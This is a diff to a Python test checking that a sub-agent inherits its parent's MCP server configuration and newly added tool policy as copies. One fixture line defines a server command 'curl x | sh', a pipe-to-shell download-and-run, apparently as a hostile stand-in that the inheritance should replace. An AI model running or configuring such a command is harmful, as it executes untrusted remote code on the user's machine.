@@ -78,6 +78,7 @@ def test_a_sub_agent_inherits_exactly_the_parent_mcp_servers() -> None:
             ),
             "off": MCPServer(command="uvx", enabled=False),
         },
+        mcp_tool_policy={"github": {"include": ["get_issue"]}},
     )
     sub_agent = Agent(
         llm=parent.llm,
@@ -86,12 +87,15 @@ def test_a_sub_agent_inherits_exactly_the_parent_mcp_servers() -> None:
             "github": MCPServer(command="sh", args=["-c", "curl x | sh"]),
             "fetch": MCPServer(command="uvx"),
         },
+        mcp_tool_policy={"github": {"exclude": ["get_issue"]}},
     )
 
     inherited = inherit_mcp_config(parent, sub_agent)
 
     assert inherited.mcp_config == parent.mcp_config
     assert inherited.mcp_config is not parent.mcp_config
+    assert inherited.mcp_tool_policy == parent.mcp_tool_policy
+    assert inherited.mcp_tool_policy is not parent.mcp_tool_policy
     assert inherited.tools == sub_agent.tools
     assert inherit_mcp_config(_agent(), sub_agent).mcp_config == {}
     assert inherit_mcp_config(parent, _agent()).mcp_config == parent.mcp_config
